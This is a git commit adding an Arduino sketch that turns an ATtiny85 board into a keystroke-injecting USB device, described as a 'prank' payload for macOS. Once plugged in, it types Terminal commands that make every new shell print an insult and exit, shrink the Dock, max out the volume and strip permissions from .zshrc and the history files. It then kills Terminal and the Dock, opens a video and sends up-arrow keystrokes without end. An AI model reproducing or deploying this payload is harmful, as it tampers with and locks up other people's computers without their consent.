799e0f014bc0863fd0146d13f3d9a77912873617
Kema-dev <jeremy.jdn@free.fr>
2021-04-13 17:19:05 -0400

    42 prank added

---
+++ 42_prank_v1.ino
@@ -0,0 +1,26 @@
+/*
+ * Created by Kema-dev
+ * To be compiled and flashed with Arduino IDE, on an AT Tiny 85 device, with appropriate libraries
+ * This payload is designed for MacOS
+ * It opens a regular terminal and pimps the zshrc, dock, and opens a regular rickroll
+ */
+
+#include "DigiKeyboard.h"
+void setup() {
+  //empty
+}
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.println("terminal");
+  DigiKeyboard.delay(600);
+  DigiKeyboard.println("echo -e \"echo \"YOU GOT PRANKED ASSHOLE\"\nsleep 5; exit\" >> ~/.zshrc");
+  DigiKeyboard.println("defaults write com.apple.dock tilesize -integer 1 && defaults write com.apple.dock largesize -integer 1");
+  DigiKeyboard.println("osascript -e \"set Volume 100\"");
+  DigiKeyboard.println("chmod 000 ~/.zsh_history ~/.bash_history ~/.zshrc && clear");
+  DigiKeyboard.println("open \"https://youtu.be/dQw4w9WgXcQ?t=43s\" && killall iTerm  && killall Terminal && killall Dock");
+  DigiKeyboard.delay(2500);
+  DigiKeyboard.sendKeyStroke(KEY_F);
+  while (1) DigiKeyboard.sendKeyStroke(0x52);
+}
